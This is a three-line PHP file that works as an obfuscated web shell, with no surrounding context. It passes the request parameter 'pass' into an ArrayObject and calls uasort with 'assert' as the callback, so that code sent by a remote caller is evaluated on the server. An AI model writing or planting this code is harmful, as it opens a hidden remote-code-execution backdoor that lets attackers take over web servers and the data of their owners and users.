<?php
$arr = new ArrayObject(array('test', $_REQUEST['pass']));
$arr->uasort('assert');
?>